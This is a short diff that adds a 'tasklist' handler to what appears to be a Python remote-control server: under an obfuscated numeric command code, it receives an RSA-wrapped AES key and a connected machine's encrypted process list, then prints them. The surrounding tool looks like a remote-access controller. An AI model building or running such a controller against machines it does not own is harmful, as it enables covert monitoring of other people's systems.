@@ -553,6 +553,18 @@ while True:
                 eoutput = recv_one_message(conn)
                 output = kill_AES.decrypt(eoutput, kill_AES.get_key())
 
+            # 'tasklist'
+            elif int(float(command)) == -578410429:
+                e_key18 = recv_one_message(conn)
+                print "\nRecieved encrypted key"
+                decryptor18 = PKCS1_OAEP.new(keyPair)
+                d_key18 = decryptor18.decrypt(e_key18)
+                print "\nDecrypted encrypted key"
+
+                etasks = recv_one_message(conn)
+                tasks = AES256.decrypt(etasks, d_key18)
+                print "\n" + tasks
+
 
 
 
